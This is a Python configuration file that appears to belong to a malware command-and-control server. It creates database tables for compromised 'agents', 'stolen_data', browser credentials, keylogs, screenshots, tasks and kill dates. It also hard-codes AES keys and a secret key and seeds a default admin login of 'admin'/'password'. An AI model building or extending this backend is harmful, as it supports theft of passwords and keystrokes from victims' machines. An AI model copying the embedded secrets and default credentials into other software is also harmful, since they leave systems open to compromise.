import os
import sqlite3, secrets


class Config:
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 443
        self.database = "c2.db"
        self.aes_key = b"32bytekey-ultra-secure-123456789"
        self.aes_iv = b"16byteiv-9876543"
        self.upload_folder = "uploads"
        self.screenshot_folder = "screenshots"
        self.max_content_length = 16 * 1024 * 1024  # 16MB
        self.secret_key = "mQsjJsMfsW43sdzPf9L2Sr78"
        self.version = "1.4.7"
        self.monitor_token = secrets.token_urlsafe(32)  

        
       
        # Create required directories
        os.makedirs(self.upload_folder, exist_ok=True)

        #os.makedirs(self.screenshot_folder, exist_ok=True)

        # Initialize database
        self.init_db()

    def init_db(self):
        conn = sqlite3.connect(self.database)
        c = conn.cursor()
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                hostname TEXT,
                ip TEXT,
                os TEXT,
                last_seen TEXT,
                status TEXT,
                privilege TEXT,
                ws_connected INTEGER DEFAULT 0,
                killdate TEXT DEFAULT NULL,
                checkin_interval INTEGER DEFAULT 10
            )
        ''')
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS stolen_data (
                id INTEGER PRIMARY KEY,
                agent_id TEXT,
                browser TEXT,
                data_type TEXT,
                content BLOB,
                system_info TEXT,
                timestamp TEXT
            )
        ''')
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS tasks (
                id INTEGER PRIMARY KEY,
                agent_id TEXT,
                task_type TEXT,
                task_data TEXT,
                status TEXT,
                created_at TEXT,
                completed_at TEXT
            )
        ''')
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY,
                agent_id TEXT,
                browser TEXT,
                url TEXT,
                username TEXT,
                password TEXT,
                timestamp TEXT
            )
        ''')
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY,
                agent_id TEXT,
                image BLOB,
                timestamp TEXT
            )
        ''')
        
        c.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                username TEXT UNIQUE,
                password TEXT,
                email TEXT
            )
        ''')

        c.execute('''
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                keys TEXT NOT NULL,
                timestamp TEXT NOT NULL
            )
        ''')

        c.execute('''
            CREATE TABLE IF NOT EXISTS agent_configurations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                checkin_interval INTEGER NOT NULL,
                server_url TEXT NOT NULL,
                take_screenshots INTEGER NOT NULL,
                screenshot_frequency INTEGER NOT NULL,
                killdate_enabled INTEGER NOT NULL,
                killdate TEXT,
                trusted_certificate INTEGER NOT NULL,
                timestamp TEXT NOT NULL
            )
        ''')
        
        # Add default admin if not exists
        from werkzeug.security import generate_password_hash
        c.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?, ?)", 
                 (1, "admin", generate_password_hash("password"),"admin@home.no"))
        
        conn.commit()
        conn.close()

CONFIG = Config()
